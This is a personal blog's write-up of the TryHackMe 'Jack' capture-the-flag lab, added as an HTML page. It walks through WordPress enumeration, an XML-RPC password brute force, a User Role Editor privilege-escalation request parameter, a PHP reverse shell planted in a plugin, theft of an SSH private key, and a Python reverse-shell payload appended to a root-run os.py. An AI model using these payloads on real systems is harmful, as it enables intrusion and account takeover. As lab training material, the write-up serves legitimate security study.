@@ -1,0 +1,445 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Jack | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe CTF — WordPress enumeration, XML-RPC credential attack, User Role Editor privilege escalation via Burp, plugin reverse shell, SSH key extraction, and Python os.py hijack for root.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/jack-ctf.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/jack-ctf.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Jack">
+<meta property="og:description" content="WordPress enumeration, XML-RPC credential attack, privilege escalation via Burp, plugin reverse shell, Python os.py hijack for root.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Jack">
+<meta name="twitter:description" content="WordPress enumeration, XML-RPC credential attack, privilege escalation via Burp, plugin reverse shell, Python os.py hijack for root.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span>Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span class="active">Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Jack</h1>
+    <div class="post-description">TryHackMe CTF &mdash; WordPress enumeration, XML-RPC credential attack, User Role Editor privilege escalation via Burp, Akismet plugin reverse shell, SSH key extraction, and Python library hijack for root.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>Jack's Creepy Twin Chronicles. WordPress 5.3.2 on Apache 2.4.18. Ports 22 and 80. My little ethical hacker heart was all aflutter.</p>
+
+<hr>
+
+<h2>Initial Enumeration</h2>
+
+<p>Added the target to <code>/etc/hosts</code>, then Nmap while browsing the site:</p>
+
+<pre><code>nmap -sC -sV -p- -T4 10.145.146.236</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 4.48.27 PM.png" alt="Target web app — Jack's WordPress blog" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 4.51.46 PM.png" alt="WordPress 5.3.2 on Apache 2.4.18, ports 22 and 80" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 5.00.03 PM.png" alt="Nmap results confirming open ports and service versions" style="max-width:100%;margin:1rem 0;">
+
+<p>Searchsploit surfaced an RCE for WordPress 5.3.2, but something wasn't sitting right. Broader search:</p>
+
+<pre><code>searchsploit wordpress priv</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 6.49.40 PM.png" alt="Searchsploit WordPress RCE result" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 6.48.57 PM.png" alt="ExploitDB confirming User Role Editor privilege escalation" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 6.54.49 PM.png" alt="WordPress Plugin User Role Editor < 4.25 privilege escalation identified" style="max-width:100%;margin:1rem 0;">
+
+<p>Found it: <code>WordPress Plugin User Role Editor &lt; 4.25 - Privilege Escalation</code>. That's the path.</p>
+
+<p>Ran the vuln scan for good measure:</p>
+
+<pre><code>nmap -sS -Pn -sC -sV --script=vuln -T4 -A 10.145.177.54 -oN jack_nmap_result.txt</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.18.06 PM.png" alt="Vuln scan returning usernames, versions, and vulnerability details" style="max-width:100%;margin:1rem 0;">
+
+<p>Usernames, versions, vulnerabilities, the works. Then WordPress plugin enumeration:</p>
+
+<pre><code>nmap -sV --script http-wordpress-enum 10.145.177.54</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.32.01 PM.png" alt="http-wordpress-enum surfacing installed plugins" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>WPScan Enumeration</h2>
+
+<pre><code>wpscan --url http://10.145.177.54 --enumerate ap --connect-timeout 10 --detection-mode aggressive --plugins-detection mixed</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.40.16 PM.png" alt="WPScan aggressive plugin enumeration results" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.40.44 PM.png" alt="WPScan confirming User Role Editor plugin presence" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>wpscan --url http://10.145.177.54 --enumerate u --connect-timeout 10</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.43.46 PM.png" alt="WPScan user enumeration finding jack, wendy, danny" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.44.03 PM.png" alt="XML-RPC confirmed enabled" style="max-width:100%;margin:1rem 0;">
+
+<p>Three users: <code>jack</code>, <code>wendy</code>, <code>danny</code>. XML-RPC alive and well.</p>
+
+<hr>
+
+<h2>Credential Attack — XML-RPC via Metasploit</h2>
+
+<p>Created a username file with all three, then:</p>
+
+<pre><code>msfconsole -qx 'search wordpress_xmlrpc_login'</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.53.27 PM.png" alt="Metasploit XML-RPC login module configured" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 7.57.57 PM.png" alt="Wendy's credentials recovered — you just got pwned, Wendy" style="max-width:100%;margin:1rem 0;">
+
+<p>Wendy's credentials recovered. You just got pwned, Wendy.</p>
+
+<p>Confirmed with WPScan:</p>
+
+<pre><code>wpscan --url http://jack.thm -U jack_usernames.txt -P /usr/share/wordlists/fasttrack.txt</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 8.04.59 PM.png" alt="WPScan confirming Wendy's credentials" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>WordPress Login and Privilege Escalation</h2>
+
+<p>Logged in as Wendy at <code>http://jack.thm/wp-admin.php</code>.</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 8.08.41 PM.png" alt="WordPress admin login as Wendy" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 8.09.55 PM.png" alt="Logged in as Wendy — subscriber level access" style="max-width:100%;margin:1rem 0;">
+
+<p>Configured Burp and FoxyProxy to intercept the profile update POST request at <code>/wp-admin/profile.php</code>. Added the payload to the last line of the intercepted GET request:</p>
+
+<pre><code>ure_other_roles=administrator</code></pre>
+
+<p>Forwarded the edited request, then clicked Update Profile.</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.10.28 PM.png" alt="Burp intercepted POST with ure_other_roles=administrator payload" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.11.21 PM.png" alt="Profile update forwarded successfully" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 8.47.12 PM.png" alt="Wendy now shows as Administrator" style="max-width:100%;margin:1rem 0;">
+
+<p>Admin. Made Wendy admin too for persistence.</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.16.12 PM.png" alt="Wendy promoted to administrator for persistence" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Reverse Shell via Akismet Plugin</h2>
+
+<p>Navigated to Plugins &rarr; Edit Plugins. Injected a PHP reverse shell into the Akismet plugin source.</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.19.35 PM.png" alt="Plugin editor open showing Akismet source" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.40.47 PM.png" alt="PHP reverse shell payload injected into Akismet plugin" style="max-width:100%;margin:1rem 0;">
+
+<p>Listener up before clicking Update File:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.27.19 PM.png" alt="Netcat listener started on attack machine" style="max-width:100%;margin:1rem 0;">
+
+<p>Updated the file, navigated to Plugins, clicked Activate below Akismet.</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.43.39 PM.png" alt="Plugins page after Update File" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.47.11 PM 1.png" alt="Akismet activate button" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.49.12 PM.png" alt="Shell landed as www-data" style="max-width:100%;margin:1rem 0;">
+
+<p>Shell achieved. Stabilized with Python.</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.55.27 PM.png" alt="Python shell stabilization — first attempt with syntax note" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 9.56.14 PM.png" alt="Stable shell confirmed" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>SSH Key Extraction</h2>
+
+<p>Checked www-data permissions, then looked around:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.01.18 PM.png" alt="www-data permissions check" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.04.28 PM.png" alt="Directory exploration finding id_rsa" style="max-width:100%;margin:1rem 0;">
+
+<p>Found Jack's <code>id_rsa</code>. Copied it locally:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.07.26 PM.png" alt="id_rsa contents — private key extracted" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>chmod 600 id_rsa</code></pre>
+
+<p>Port 22 was open from the initial scan. SSH as Jack:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.11.15 PM.png" alt="SSH as jack using extracted private key" style="max-width:100%;margin:1rem 0;">
+
+<p>User flag:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.24.42 PM.png" alt="user.txt flag retrieved" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>0052f7829e48752f2e7bf50f1231548a</code></pre>
+
+<hr>
+
+<h2>Privilege Escalation — Python os.py Hijack</h2>
+
+<p>The machine hinted at Python. Found <code>checker.py</code> running as root every two minutes, importing the <code>os</code> module:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.26.48 PM.png" alt="checker.py discovered importing os module" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.27.56 PM.png" alt="Cron schedule confirming checker.py runs every 2 minutes as root" style="max-width:100%;margin:1rem 0;">
+
+<p>Checked permissions on <code>os.py</code>:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.28.33 PM.png" alt="os.py permissions — writable by jack" style="max-width:100%;margin:1rem 0;">
+
+<p>Jack can write to it. Injected a reverse shell at the end of <code>os.py</code>:</p>
+
+<pre><code>import socket
+import pty
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("KALI_IP", 22444))
+dup2(s.fileno(),0)
+dup2(s.fileno(),1)
+dup2(s.fileno(),2)
+pty.spawn("/bin/bash")
+s.close()</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.29.33 PM.png" alt="Reverse shell payload appended to os.py" style="max-width:100%;margin:1rem 0;">
+
+<p>Listener up:</p>
+
+<pre><code>rlwrap nc -nlvp 22444</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.47.04 PM.png" alt="Navigating to os.py location via SSH as jack" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.47.27 PM.png" alt="Listener waiting for cron to fire" style="max-width:100%;margin:1rem 0;">
+
+<p>Within two minutes, cron fired and the shell landed:</p>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 10.17.29 PM.png" alt="Root shell received via os.py hijack" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>root@jack:~# cat root.txt
+b8b63a861cc09e853f29d8055d64bffb</code></pre>
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 11.10.26 PM.png" alt="root.txt flag retrieved" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/jack-ctf/Screenshot 2026-04-03 at 11.11.03 PM.png" alt="Root shell confirmed" style="max-width:100%;margin:1rem 0;">
+
+<hr>
+
+<h2>Full Attack Chain</h2>
+
+<pre><code>Nmap → WordPress 5.3.2, Apache 2.4.18, ports 22 + 80
+→ WPScan → users (jack, wendy, danny), XML-RPC enabled, User Role Editor plugin
+→ Metasploit XML-RPC brute force → Wendy:password recovered
+→ WordPress login → Burp intercept → ure_other_roles=administrator → admin access
+→ Akismet plugin edit → PHP reverse shell → www-data shell
+→ Python shell stabilization → id_rsa found → SSH as jack → user flag
+→ checker.py runs as root every 2 min importing os
+→ os.py writable by jack → reverse shell appended
+→ cron fires → root shell → root flag</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
